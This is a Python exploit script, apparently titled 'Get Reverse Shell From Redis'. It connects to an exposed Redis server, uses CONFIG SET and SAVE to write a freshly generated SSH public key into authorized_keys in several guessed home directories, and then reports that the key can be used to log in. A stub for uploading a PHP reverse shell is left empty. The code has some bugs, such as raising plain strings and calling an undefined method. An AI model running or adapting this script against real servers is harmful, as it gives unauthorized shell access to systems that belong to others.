import argparse
import socket
import subprocess

_bad    = '\033[1;31;40m[-]\033[0m'
_good   = '\033[1;32;40m[+]\033[0m'
_info   = '\033[1;33;40m[~]\033[0m'

def main(args):
    nc = Redis(args.target, args.port)

    with nc as session:
        if not nc.is_redis_and_vul():
            raise _bad + "This is not redis or we cannot get config"
        print(_info, 'Starting Session...')
        
        try_ssh(session)
    

def try_ssh(session):
    """
        Upload public key to authorized file
    """
    print(_info, "Trying SSH...")
    subprocess.run(['ssh-keygen', '-f', '$(pwd)/redis_ssh_key'],
                    shell=True, check=True)
    is_vulnerable = False

    try:
        with open('redis_ssh_key.pub', 'r') as stream:
            pub_key = stream.read()

        # Redis throws a lot of junk chars around dumped keys
        # padding with newlines to be safe
        commands = [
            'config set dbfilename authorized_keys',
            f'set SSH_Key "\n\n\n{pub_key}\n\n\n""',
            'SAVE'
        ]
        # Minimum amount for exploit to work first
        session.send_payload(commands)

        # Find a home user dir we can write to
        commands = [
            f'config set dir /var/lib/{session.user}/.ssh',
            f'config set dir /var/{session.user}/.ssh',
            f'config set dir /etc/{session.user}/.ssh',
            f'config set dir /opt/{session.user}/.ssh',
            f'config set dir /home/{session.user}/.ssh'
        ]
        for command in commands:
            print(_info, 'Trying dir "{}"'.format(command.split(' ')[-1]))
            result = session.send_payload([command, 'SAVE'])
            if 'OK' in result:
                is_vulnerable = True
                break

        # Return shell
        if is_vulnerable:
            # paramiko to use as ssh client
            print(_good, 'Upload Complete: use redis_ssh_key to SSH')
        else:
            print(_bad, 'Upload Failed')

    finally:
        if not is_vulnerable:
            subprocess.run('rm redis_ssh_key redis_ssh_key.pub')


def try_www(session):
    """
        Upload php reverse shell script, then invoke
    """
    pass


class Redis:
    """
        Because Subprocess wasn't that fun of an idea
    """
    def __init__(self, hostname:str, port:int = 6379, username:str = 'redis'):
        """
            :param hostname:    Hostname or IP of target
            :param port:        Port Of Redis Service
            :param username:    Account Redis is running under
        """
        self.hostname = hostname
        self.port = port
        self.user = 'redis'
        self.session = None
        if not self.is_redis():
            raise "This Is Not Redis"
        

    def __enter__(self):
        """ Establish socket connection """

        self.session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.session.connect((self.hostname, self.port))
        return self


    def __exit__(self, exc_type, exc_val, exc_tb):
        """ Cleanup Of Socket """

        self.session.close()


    def is_redis_and_vul(self) -> bool:
        """ Returns true if connection is Redis and we can get config"""

        self.session.send(b'CONFIG GET *\n')
        return True if 'err' not in self.session.recv(1024).decode() else False


    def send_payload(self, payload:list, read_bytes:int=1024):
        """ Send list of commands to objects socket connection """

        data = []
        for command in payload:
            self.session.send(command.encode() + b'\n')
            data.append(self.session.recv(read_bytes).decode())
        return data


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Get Reverse Shell From Redis')
    parser.add_argument('target', type=str,
                        help='ip/hostname of target')

    parser.add_argument('-p', '--port', type=int, default=6379,
                        dest='port', help='port of redis server')

    parser.add_argument('-u', '--username', type=str, default="redis",
                        dest='username', help='suspected name of user running service "Redis"')

    """parser.add_argument('-k', '--key', nargs='?', type=argparse.FileType('r'),
                        default=sys.stdin, help='Use an already generated key')"""
    
    args = parser.parse_args()

    
    main(args)

